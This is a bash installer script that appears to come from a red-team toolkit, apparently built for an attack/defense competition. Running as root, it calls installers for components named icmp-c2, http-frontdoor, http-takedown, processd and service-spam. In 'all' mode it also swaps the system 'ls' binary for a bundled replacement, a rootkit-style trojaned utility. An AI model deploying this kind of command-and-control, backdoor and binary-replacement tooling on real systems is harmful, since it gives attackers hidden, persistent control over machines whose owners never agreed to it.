#!/bin/bash
WHICH="$1"
ROOT_PATH="$(dirname $( realpath "$0"  ))"

echo "Dirname: $ROOT_PATH"
echo "Which: $WHICH"

IS_UB_LOCKDOWN=true


if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi


httpTakedown () {
    cd "$ROOT_PATH/http-takedown"
    chmod +x ./install.sh
    ./install.sh
}

icmpC2 () {
    cd "$ROOT_PATH/icmp-c2"
    chmod +x ./install.sh
    ./install.sh
}

ping_install () {
    cd "$ROOT_PATH/ping"
    chmod +x ./install.sh
    ./install.sh
}

processd () {
    cd "$ROOT_PATH/processd"
    chmod +x ./install.sh
    ./install.sh
}

serviceSpam () {
    cd "$ROOT_PATH/service-spam"
    python3 service.py
}

rt_quick () {
    cd "$ROOT_PATH/http-frontdoor"
    chmod +x ./install.sh
    ./install.sh
}


if [[ "$WHICH" == "all" ]]; then
    # Currently debugging installer script
    icmpC2
    ping_install
    processd
    httpTakedown
    rt_quick
    
    if [[ $IS_UB_LOCKDOWN == "true" ]]; then
        cd "$ROOT_PATH/coreutils"
        chown 755 ls
        mv ls $(which ls)
    fi

    serviceSpam
fi
if [[ "$WHICH" == "icmp" ]]; then
    icmpC2
fi
if [[ "$WHICH" == "ping" ]]; then
    ping_install
fi
if [[ "$WHICH" == "processd" ]]; then
    processd
fi
if [[ "$WHICH" == "services" ]]; then
    serviceSpam
fi
if [[ "$WHICH" == "night-before" ]]; then
    rt_quick
fi